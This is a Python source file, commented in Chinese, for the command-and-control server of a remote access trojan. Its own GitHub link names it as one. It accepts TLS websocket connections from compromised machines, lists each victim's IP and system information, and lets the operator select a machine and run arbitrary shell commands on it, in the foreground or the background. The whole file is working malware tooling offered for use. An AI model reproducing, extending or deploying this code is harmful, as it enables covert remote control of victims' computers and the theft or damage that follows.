__author__ = "赵博凯"
__license__ = "GPL v3"

import asyncio
import websockets
import ssl
import rich
import json
from sys import exit

from rich.console import Console
from rich.table import Table
from rich.json import JSON
import rich.traceback 

# 安装rich的回溯追踪，显示本地变量
rich.traceback.install(show_locals=True)

# --- 基础配置 ---
# HOST: 服务器监听的IP地址
# PORT: 服务器监听的端口号
# SSL_CERT: SSL证书文件路径
# SSL_KEY: SSL私钥文件路径
HOST = '0.0.0.0' 
PORT = 8765
SSL_CERT = '../cert.pem' 
SSL_KEY = '../key.pem' 

# --- 全局变量 ---
# control_list: 存储所有连接的客户端信息
# select_client: 当前选中的客户端ID
control_list = {}
select_client = None

# --- 自定义日志输出函数 ---
class Printer:
    """自定义日志打印类，支持不同级别的日志输出"""
    def __init__(self):
        self.console = Console()
    
    def log_info(self, message: str):
        """输出信息级别日志"""
        self.console.log(f"[white on blue][*][/white on blue]", message, style="white")

    def log_warning(self, message: str):
        """输出警告级别日志"""
        self.console.log(f"[white on yellow][!][/white on yellow]", message, style="yellow")

    def log_error(self, message: str):
        """输出错误级别日志"""
        self.console.log(f"[white on red][-][/white on red]", message, style="bold red")

    def log_success(self, message: str):
        """输出成功级别日志"""
        self.console.log(f"[white on green][+][/white on green]", message, style="green")
    
    def log_debug(self, message: str):
        """输出调试级别日志"""
        self.console.log(f"[grey50][|][/grey50]", message, style="grey50")

def output(*args, type=""):
    # 日志输出函数，根据类型调用不同的打印方法
    printer = Printer()
    if type.strip() == "":
        printer.console.log(*args)
    else:
        if type == "info":
            printer.log_info(*args)
        elif type == "warning":
            printer.log_warning(*args)
        elif type == "error":
            printer.log_error(*args)
        elif type == "success":
            printer.log_success(*args)
        elif type == "debug":
            printer.log_debug(*args)
        else:
            raise ValueError(f"Invalid type: {type}")


# --- 服务器逻辑 ---
class Server:
    """服务器核心功能类，处理服务器级别的命令操作"""
    def __init__(self):
        pass
    
    def help(self):
        """显示帮助信息"""
        help_text = '''帮助信息：
[u bold yellow]help[/u bold yellow]：[green]显示帮助信息[/green]
[u bold yellow]about[/u bold yellow]：[green]显示关于信息[/green]
[u bold yellow]exit[/u bold yellow]：[green]退出程序[/green]
[u bold yellow]clear[/u bold yellow]：[green]清空终端屏幕[/green]
[u bold yellow]list[/u bold yellow]：[green]显示已连接的设备列表[/green]
[u bold yellow]select <id>[/u bold yellow]：[green]选择一个设备进行控制[/green]
[u bold yellow]delete <id>[/u bold yellow]：[green]删除已连接的设备[/green]'''  
        output(help_text, type="info")

    def about(self):
        """显示关于信息"""
        about_text = '''关于：
作者：赵博凯
版权：Copyright © 赵博凯, All Rights Reserved.
此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
使用GPL v3协议，请自觉遵守协议。'''
        output(about_text, type="info")
    
    def client_list(self):
        """显示已连接的客户端列表"""
        if len(control_list) == 0:
            output("当前没有设备连接。", type="info")
        else:
            output(f"当前已连接的设备有{len(control_list)}台", type="info")
            output("已连接的设备列表：", type="info")
            # 使用rich库的Table类创建表格
            table = Table(
                title="设备信息",
                title_style="bold blue",
                show_header=True,
                border_style="bold purple",
                show_lines=True,
                expand=True
            )
            table.add_column("[bold red]设备ID[/bold red]")
            table.add_column("[bold #FFA500]IP地址[/bold #FFA500]")
            table.add_column("[bold yellow]连接状态[/bold yellow]")
            table.add_column("[bold green]系统信息[/bold green]")
            for device in control_list.items():
                table.add_row(f"{device[0]}", 
                              f"{device[1]['ip']}", 
                              f"{device[1]['status']}",
                              f"{device[1]['systeminfo']}")
            output(table, type="info")
            del table

    def select(self, id):
        """选择要控制的客户端"""
        global select_client
        if id in control_list:
            select_client = id
            output(f"已选择设备ID为{id}的设备。", type="success")
        else:
            output(f"设备ID为{id}的设备不存在。", type="error")
    
    async def delete(self, id):
        """删除指定的客户端连接"""
        global control_list, select_client
        if id in control_list:
            websocket = control_list[id]['websocket']
            try:
                await websocket.send("exit")
            except Exception as e:
                output(f"断开设备ID为{id}的连接时发生异常: {e}", type="warning")
            control_list.pop(id)
            if select_client == id:
                select_client = None
                output("删除的设备是你当前控制的设备，已自动返回到上一级", type="info")
            output(f"成功删除ID为{id}的设备。", type="success")
        else:
            output(f"设备ID为{id}的设备不存在。", type="error")

# --- 操纵目标设备逻辑 ---
class ControlClient:
    """客户端控制类，处理对选定客户端的操作"""
    def __init__(self, id):
        self.id = id
        self.websocket = control_list[id]['websocket']

    def help(self):
        """显示客户端控制帮助信息"""
        help_text = '''帮助信息：
[u bold yellow]help[/u bold yellow]：[green]显示帮助信息[/green]
[u bold yellow]about[/u bold yellow]：[green]显示关于信息[/green]
[u bold yellow]back[/u bold yellow]：[green]退出到上一级[/green]
[u bold yellow]clear[/u bold yellow]：[green]清空终端屏幕[/green]
[u bold yellow]list[/u bold yellow]：[green]显示已连接的设备列表[/green]
[u bold yellow]select <id>[/u bold yellow]：[green]选择一个设备进行控制[/green]
[u bold yellow]delete <id>[/u bold yellow]：[green]删除已连接的设备[/green]
[u bold yellow]command[/u bold yellow]：[green]进入command,可在对方下命令并返回结果[/green]
[u bold yellow]background <command>[/u bold yellow]：[green]在后台运行命令，不返回结果[/green]
[u bold yellow]cd <dir>[/u bold yellow]：[green]切换工作目录[/green]'''
        output(help_text, type="info")
    
    async def execute_command(self, command):
        """执行命令并返回结果"""
        await self.websocket.send(f"command:{command}")
        result = await self.websocket.recv()
        return result

    async def background(self, command):
        """在后台执行命令"""
        await self.websocket.send(f"background:{command}")
        await self.websocket.recv()
        output("命令已发送", type="success")

    async def change_directory(self, directory):
        """切换工作目录"""
        await self.websocket.send(f"cd:{directory}")
        result = await self.websocket.recv()
        return result


# --- 被客户端连接处理逻辑 ---
async def handle_client(websocket):
    """处理新的客户端连接"""
    ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
    try:
        systeminfo = await websocket.recv()
    except Exception:
        systeminfo = "ERROR"
    # 将新客户端信息添加到控制列表
    control_list[str(websocket.id)] = {
        "ip": ip,
        "status": "connected",
        "websocket": websocket,
        "systeminfo": systeminfo
    }
    await websocket.wait_closed()
    
# --- 检查客户端连接状态 ---
async def check_clients_connection():
    """定期检查所有客户端的连接状态"""
    global control_list
    while True:
        if len(control_list) > 0:
            for device in control_list.items():
                try:
                    # 发送ping包检查连接
                    await device[1]['websocket'].ping()
                    control_list[device[0]]['status'] = "connected"
                    if select_client == device[0]:
                        control_list[device[0]]['status'] = "used"
                except:
                    control_list[device[0]]['status'] = "disconnected"
        await asyncio.sleep(10)

# --- 用户交互逻辑 ---
async def input_loop():
    """处理用户输入的主循环"""
    global select_client, control_list

    server = Server()
    while True:
        if select_client is None:
            # 服务器级别命令处理
            command = await asyncio.to_thread(input, "(server)> ")
            command = command.strip()
            match command:
                case "": continue
                case "help": server.help()
                case "about": server.about()
                case "exit": output("程序已正常退出。", type="success");exit()
                case "clear": print("\033[H\033[J")
                case "list": server.client_list()
                case command if command.startswith("select"): 
                    server.select(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("请输入设备ID。", type="error")
                case command if command.startswith("delete"): 
                    await server.delete(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("请输入设备ID。", type="error")
                case _: output(f"未知命令: {command}，请输入help来查看可用命令。", type="error")
        else:
            # 客户端级别命令处理
            control_client = ControlClient(select_client)
            command = await asyncio.to_thread(input, f"(console)({select_client})> ")
            command = command.strip()
            match command:
                case "": continue
                case "help": control_client.help()
                case "about": server.about()
                case "back": select_client = None
                case "clear": print("\033[H\033[J")
                case "list": server.client_list()
                case command if command.startswith("select"): 
                    server.select(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("请输入设备ID。", type="error")
                case command if command.startswith("delete"):
                    await server.delete(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("请输入设备ID。", type="error")
                case "command":
                    # 命令执行模式
                    while True:
                        try:
                            command = await asyncio.to_thread(input, f"(command)({select_client})> ")
                            if command == "exit":
                                break
                            else:
                                if command.strip() == "":
                                    continue
                                result = await control_client.execute_command(command)
                                result = json.loads(result)
                                for key, value in result.items():
                                    output(f"[bold cyan]{key}:[/bold cyan] {value}")
                        except Exception as e:
                            output(f"执行命令时发生异常: {e}", type="error")
                case command if command.startswith("background"):
                    try:
                        await control_client.background(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("请输入命令。", type="error")
                    except Exception as e:
                        output(f"后台运行命令时发生异常: {e}", type="error")
                case command if command.startswith("cd"):
                    try:
                        result = await control_client.change_directory(command.split(maxsplit=1)[1]);output(result, type="info") if len(command.split(maxsplit=1)) > 1 else output("请输入切换目录。", type="error")
                    except Exception as e:
                        output(f"切换目录时发生异常: {e}", type="error")
                case _: output(f"未知命令: {command}，请输入help来查看可用命令。", type="error")

# --- 主函数 ---
async def server_loop():
    """启动服务器的主循环"""
    output(f"正在配置证书文件, 证书位置: {SSL_CERT}, 密钥位置: {SSL_KEY}", type="info")
    try:
        # 配置SSL上下文
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
    except FileNotFoundError:
        output("证书文件或密钥文件不存在，请检查配置。", type="error")
        exit()

    output(f"正在启动服务器, 监听地址: {HOST}, 端口: {PORT}", type="info")
    # 启动WebSocket服务器
    async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
        await asyncio.Future()

async def main():
    """程序主入口"""
    output("正在启动程序...", type="info")
    # 并发运行服务器、输入循环和连接检查
    await asyncio.gather(
        server_loop(),
        input_loop(),
        check_clients_connection()
    )

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        output("版权所有：Copyright © 赵博凯, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        output("用户手动中断程序。", type="warning")
        exit()
    except Exception as e:
        output(f"错误: {e}，请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]", type="error")
